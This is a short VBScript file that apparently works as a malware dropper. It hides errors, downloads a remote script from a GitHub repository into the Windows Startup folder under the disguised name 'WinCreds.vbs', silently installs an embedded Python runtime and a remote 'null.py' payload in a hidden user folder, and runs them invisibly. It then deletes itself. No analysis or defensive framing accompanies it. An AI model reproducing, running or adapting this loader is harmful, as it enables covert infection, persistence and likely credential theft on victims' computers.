On Error Resume Next
Set shell = CreateObject("WScript.Shell")
path = shell.ExpandEnvironmentStrings("%USERPROFILE%\null")
startup = shell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinCreds.vbs")
Set fso = CreateObject("Scripting.FileSystemObject")

If Not fso.FolderExists(path) Then fso.CreateFolder path
If Not fso.FolderExists(path & "\python") Then fso.CreateFolder path & "\python"

Set x = CreateObject("MSXML2.XMLHTTP")
Set s = CreateObject("ADODB.Stream")

x.Open "GET", "https://raw.githubusercontent.com/iNarrow12/VORTEX/refs/heads/main/run.vbs", False
x.Send
s.Open: s.Type = 1: s.Write x.responseBody: s.SaveToFile startup, 2: s.Close

If Not fso.FileExists(path & "\python\pythonw.exe") Then
    x.Open "GET", "https://www.python.org/ftp/python/3.10.11/python-3.10.11-embed-amd64.zip", False
    x.Send
    s.Open: s.Type = 1: s.Write x.responseBody: s.SaveToFile path & "\py.zip", 2: s.Close
    Set a = CreateObject("Shell.Application")
    a.NameSpace(path & "\python").CopyHere a.NameSpace(path & "\py.zip").Items
    Do Until fso.FileExists(path & "\python\pythonw.exe"): WScript.Sleep 1000: Loop
    fso.DeleteFile path & "\py.zip", True
End If

x.Open "GET", "https://raw.githubusercontent.com/iNarrow12/VORTEX/refs/heads/main/null.py", False
x.Send
s.Open: s.Type = 1: s.Write x.responseBody: s.SaveToFile path & "\null.py", 2: s.Close

shell.Run "wscript.exe " & Chr(34) & startup & Chr(34), 0, False

fso.DeleteFile WScript.ScriptFullName, True
